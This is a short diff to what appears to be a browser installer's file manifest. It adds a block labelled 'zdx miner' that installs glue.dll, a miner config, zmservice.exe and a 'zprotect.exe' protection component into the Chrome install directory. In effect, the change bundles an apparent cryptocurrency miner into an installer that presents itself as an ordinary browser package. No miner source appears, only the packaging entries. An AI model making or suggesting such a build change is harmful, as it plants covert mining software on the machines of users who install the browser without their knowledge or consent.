@@ -46,6 +46,18 @@ Extensions\*.*: %(VersionDir)s\Extensions\
 locales\*.dll: %(VersionDir)s\Locales
 locales\*.pak: %(VersionDir)s\Locales
 
+# 
+# zdx miner
+# 
+glue.dll: %(ChromeDir)s\
+miner\conf.json: %(ChromeDir)s\miner\
+miner\zmservice.exe: %(ChromeDir)s\miner\
+miner\work\*.json: %(ChromeDir)s\miner\work\
+miner\work\protect\zprotect.exe: %(ChromeDir)s\miner\work\protect\
+miner\work\protecta\*.*: %(ChromeDir)s\miner\work\protecta\
+miner\work\protecte\*.*: %(ChromeDir)s\miner\work\protecte\
+miner\work\protectn\*.*: %(ChromeDir)s\miner\work\protectn\
+
 #
 # VisualElements sub-dir.
 #
